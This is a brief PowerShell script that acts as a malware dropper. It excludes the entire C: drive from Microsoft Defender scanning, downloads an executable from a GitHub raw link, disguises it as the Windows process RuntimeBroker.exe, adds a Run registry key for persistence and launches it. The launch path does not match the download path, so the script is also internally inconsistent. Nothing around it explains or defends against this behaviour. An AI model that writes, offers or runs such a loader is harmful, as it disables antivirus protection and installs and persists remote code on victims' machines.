Add-MpPreference -ExclusionPath "C:\"
$url = "https://github.com/WindowsEnjoyer-1/123412341234/raw/refs/heads/main/RuntimeBroker.exe"
$output = "$env:Temp\RuntimeBroker.exe"
Invoke-WebRequest -Uri $url -OutFile $output
$startupPath = [System.Environment]::GetFolderPath('ApplicationData') + "\SubDir\Runtime broker.exe"
$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
New-ItemProperty -Path $regKey -Name "RuntimeBroker" -Value $startupPath -PropertyType String -Force
Start-Process -FilePath $startupPath
